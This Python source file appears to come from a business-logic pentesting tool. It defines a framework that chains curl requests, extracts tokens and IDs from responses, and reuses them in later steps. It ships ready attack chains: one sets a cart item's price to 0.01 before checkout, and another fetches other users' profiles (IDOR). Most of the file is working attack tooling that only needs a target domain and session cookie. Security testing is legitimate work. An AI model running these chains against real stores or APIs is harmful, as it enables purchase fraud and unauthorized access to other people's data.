# LogiScythe - exploit_chain.py
# Author: dangnosuy (Dang) & Gemini
# Automated exploit chains for complex business flow testing

import json
import re
from typing import List, Dict, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

class ChainStepStatus(Enum):
    """Status of a chain step execution"""
    PENDING = "pending"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"


@dataclass
class ChainStep:
    """Represents one step in an exploit chain"""
    name: str
    description: str
    curl_command: str
    expected_status: int = 200
    extract_variables: Dict[str, str] = field(default_factory=dict)  # variable_name: regex_pattern
    validators: List[Dict[str, Any]] = field(default_factory=list)  # validation rules
    status: ChainStepStatus = ChainStepStatus.PENDING
    result: Optional[Dict[str, str]] = None
    extracted_data: Dict[str, str] = field(default_factory=dict)


class ExploitChain:
    """
    Manages complex multi-step exploit chains for business logic testing.
    Allows chaining requests where later steps depend on earlier step outputs.
    """
    def __init__(self, name: str, description: str = ""):
        self.name = name
        self.description = description
        self.steps: List[ChainStep] = []
        self.global_variables: Dict[str, str] = {}
        self.chain_result = {
            "success": False,
            "steps_completed": 0,
            "total_steps": 0,
            "failure_point": None,
            "extracted_data": {}
        }
        print(f"[ExploitChain] Initialized chain: {name}")

    def add_step(self, name: str, description: str, curl_command: str,
                 expected_status: int = 200,
                 extract_variables: Dict[str, str] = None,
                 validators: List[Dict[str, Any]] = None) -> ChainStep:
        """Add a step to the exploit chain"""
        step = ChainStep(
            name=name,
            description=description,
            curl_command=curl_command,
            expected_status=expected_status,
            extract_variables=extract_variables or {},
            validators=validators or []
        )
        self.steps.append(step)
        self.chain_result["total_steps"] = len(self.steps)
        print(f"[ExploitChain] Added step {len(self.steps)}: {name}")
        return step

    def set_global_variable(self, name: str, value: str):
        """Set a global variable that can be used across all steps"""
        self.global_variables[name] = value
        print(f"[ExploitChain] Set global variable: {name} = {value}")

    def execute_chain(self, exploiter) -> Dict[str, Any]:
        """
        Execute the entire exploit chain step by step.
        
        Args:
            exploiter: Instance of Exploiter class to run commands
            
        Returns:
            Dictionary with chain execution results
        """
        print(f"\n{'='*60}")
        print(f"ðŸ”— Executing Exploit Chain: {self.name}")
        print(f"{'='*60}")
        print(f"Description: {self.description}")
        print(f"Total Steps: {len(self.steps)}\n")

        for idx, step in enumerate(self.steps, 1):
            print(f"\n{'â”€'*60}")
            print(f"Step {idx}/{len(self.steps)}: {step.name}")
            print(f"{'â”€'*60}")
            print(f"Description: {step.description}")

            # Replace variables in command
            command = self._replace_variables(step.curl_command)
            print(f"Command: {command[:100]}..." if len(command) > 100 else f"Command: {command}")

            # Execute step
            result = exploiter.run_single_attack(command)
            step.result = result
            step.status = ChainStepStatus.SUCCESS  # Will be updated based on validation

            # Check status code
            stdout = result.get("stdout", "")
            stderr = result.get("stderr", "")
            
            status_code = self._extract_status_code(stdout)
            print(f"Status Code: {status_code} (Expected: {step.expected_status})")

            if status_code != step.expected_status:
                print(f"âŒ Step FAILED: Status code mismatch")
                step.status = ChainStepStatus.FAILED
                self.chain_result["failure_point"] = step.name
                break

            # Run validators
            if not self._validate_response(step, stdout):
                print(f"âŒ Step FAILED: Validation failed")
                step.status = ChainStepStatus.FAILED
                self.chain_result["failure_point"] = step.name
                break

            # Extract variables for next steps
            if step.extract_variables:
                extracted = self._extract_variables(stdout, step.extract_variables)
                step.extracted_data = extracted
                self.global_variables.update(extracted)
                print(f"âœ… Extracted variables: {list(extracted.keys())}")
                for var_name, var_value in extracted.items():
                    print(f"   {var_name} = {var_value[:50]}..." if len(var_value) > 50 else f"   {var_name} = {var_value}")

            print(f"âœ… Step {idx} completed successfully")
            self.chain_result["steps_completed"] += 1

        # Final results
        self.chain_result["success"] = (self.chain_result["steps_completed"] == len(self.steps))
        self.chain_result["extracted_data"] = self.global_variables.copy()

        print(f"\n{'='*60}")
        if self.chain_result["success"]:
            print(f"âœ… Exploit Chain SUCCEEDED!")
        else:
            print(f"âŒ Exploit Chain FAILED at: {self.chain_result['failure_point']}")
        print(f"Steps Completed: {self.chain_result['steps_completed']}/{len(self.steps)}")
        print(f"{'='*60}\n")

        return self.chain_result

    def _replace_variables(self, command: str) -> str:
        """Replace {variable_name} placeholders with actual values"""
        result = command
        for var_name, var_value in self.global_variables.items():
            placeholder = f"{{{var_name}}}"
            result = result.replace(placeholder, var_value)
        return result

    def _extract_status_code(self, http_response: str) -> int:
        """Extract HTTP status code from curl response"""
        # Look for HTTP/1.1 200 OK pattern
        match = re.search(r'HTTP/[\d.]+\s+(\d+)', http_response)
        if match:
            return int(match.group(1))
        return 0

    def _extract_variables(self, response_text: str, patterns: Dict[str, str]) -> Dict[str, str]:
        """Extract variables from response using regex patterns"""
        extracted = {}
        for var_name, pattern in patterns.items():
            match = re.search(pattern, response_text)
            if match:
                # If pattern has groups, use first group; otherwise use full match
                extracted[var_name] = match.group(1) if match.groups() else match.group(0)
            else:
                print(f"âš ï¸  Warning: Could not extract variable '{var_name}' with pattern '{pattern}'")
                extracted[var_name] = ""
        return extracted

    def _validate_response(self, step: ChainStep, response: str) -> bool:
        """Validate response against defined rules"""
        if not step.validators:
            return True

        for validator in step.validators:
            validator_type = validator.get("type")
            
            if validator_type == "contains":
                text = validator.get("text", "")
                if text not in response:
                    print(f"âŒ Validation failed: Response does not contain '{text}'")
                    return False
                    
            elif validator_type == "not_contains":
                text = validator.get("text", "")
                if text in response:
                    print(f"âŒ Validation failed: Response contains forbidden text '{text}'")
                    return False
                    
            elif validator_type == "regex":
                pattern = validator.get("pattern", "")
                if not re.search(pattern, response):
                    print(f"âŒ Validation failed: Response does not match regex '{pattern}'")
                    return False
                    
            elif validator_type == "json_field":
                field = validator.get("field", "")
                expected = validator.get("value")
                try:
                    # Extract JSON from response
                    json_match = re.search(r'\{.*\}', response, re.DOTALL)
                    if json_match:
                        data = json.loads(json_match.group(0))
                        actual = self._get_nested_field(data, field)
                        if actual != expected:
                            print(f"âŒ Validation failed: Field '{field}' = {actual}, expected {expected}")
                            return False
                except Exception as e:
                    print(f"âŒ Validation failed: Could not parse JSON or find field '{field}': {e}")
                    return False

        return True

    def _get_nested_field(self, data: dict, field: str) -> Any:
        """Get nested field from dict using dot notation (e.g., 'user.id')"""
        keys = field.split('.')
        value = data
        for key in keys:
            if isinstance(value, dict):
                value = value.get(key)
            else:
                return None
        return value

    def to_dict(self) -> Dict[str, Any]:
        """Convert chain to dictionary for reporting"""
        return {
            "name": self.name,
            "description": self.description,
            "total_steps": len(self.steps),
            "result": self.chain_result,
            "steps": [
                {
                    "name": step.name,
                    "description": step.description,
                    "status": step.status.value,
                    "extracted_data": step.extracted_data
                }
                for step in self.steps
            ]
        }


# Pre-defined common exploit chains
class CommonChains:
    """Library of common business logic exploit chains"""
    
    @staticmethod
    def price_manipulation_chain() -> ExploitChain:
        """Chain to test price manipulation in e-commerce checkout"""
        chain = ExploitChain(
            name="Price Manipulation Attack",
            description="Test if product price can be manipulated during checkout flow"
        )
        
        chain.add_step(
            name="Add Product to Cart",
            description="Add product with original price",
            curl_command="curl -X POST https://{target_domain}/api/cart/add -H 'Cookie: {session_cookie}' -H 'Content-Type: application/json' -d '{\"product_id\": 123, \"quantity\": 1}'",
            expected_status=200,
            extract_variables={
                "cart_id": r'"cart_id":\s*"?(\w+)"?',
                "original_price": r'"price":\s*(\d+\.?\d*)'
            },
            validators=[
                {"type": "contains", "text": "success"},
                {"type": "json_field", "field": "status", "value": "added"}
            ]
        )
        
        chain.add_step(
            name="Manipulate Price",
            description="Attempt to change price before checkout",
            curl_command="curl -X PUT https://{target_domain}/api/cart/{cart_id} -H 'Cookie: {session_cookie}' -H 'Content-Type: application/json' -d '{\"product_id\": 123, \"price\": 0.01}'",
            expected_status=200
        )
        
        chain.add_step(
            name="Checkout with Manipulated Price",
            description="Complete checkout and verify if manipulation succeeded",
            curl_command="curl -X POST https://{target_domain}/api/checkout -H 'Cookie: {session_cookie}' -H 'Content-Type: application/json' -d '{\"cart_id\": \"{cart_id}\"}'",
            expected_status=200,
            extract_variables={
                "final_price": r'"total":\s*(\d+\.?\d*)',
                "order_id": r'"order_id":\s*"?(\w+)"?'
            }
        )
        
        return chain

    @staticmethod
    def idor_chain() -> ExploitChain:
        """Chain to test IDOR vulnerability"""
        chain = ExploitChain(
            name="IDOR (Insecure Direct Object Reference)",
            description="Test if user can access other users' resources"
        )
        
        chain.add_step(
            name="Access Own Profile",
            description="Get legitimate user ID",
            curl_command="curl -X GET https://{target_domain}/api/profile -H 'Cookie: {session_cookie}'",
            expected_status=200,
            extract_variables={
                "user_id": r'"user_id":\s*(\d+)'
            }
        )
        
        chain.add_step(
            name="Attempt Access to Other User",
            description="Try to access profile of user_id + 1",
            curl_command="curl -X GET https://{target_domain}/api/profile/{other_user_id} -H 'Cookie: {session_cookie}'",
            expected_status=200,  # If this succeeds, IDOR exists
            validators=[
                {"type": "not_contains", "text": "unauthorized"},
                {"type": "not_contains", "text": "forbidden"}
            ]
        )
        
        return chain


# Example usage
if __name__ == "__main__":
    print("[+] Testing ExploitChain...")
    
    # Create a custom chain
    chain = ExploitChain(
        name="Test Chain",
        description="Example multi-step exploit"
    )
    
    chain.set_global_variable("target_domain", "example.com")
    chain.set_global_variable("session_cookie", "session=abc123")
    
    chain.add_step(
        name="Login",
        description="Authenticate user",
        curl_command="curl -X POST https://{target_domain}/login -d 'user=test&pass=test'",
        expected_status=200,
        extract_variables={
            "token": r'"token":\s*"([^"]+)"'
        }
    )
    
    chain.add_step(
        name="Get Data",
        description="Fetch protected resource",
        curl_command="curl -X GET https://{target_domain}/api/data -H 'Authorization: Bearer {token}'",
        expected_status=200
    )
    
    print(json.dumps(chain.to_dict(), indent=2))
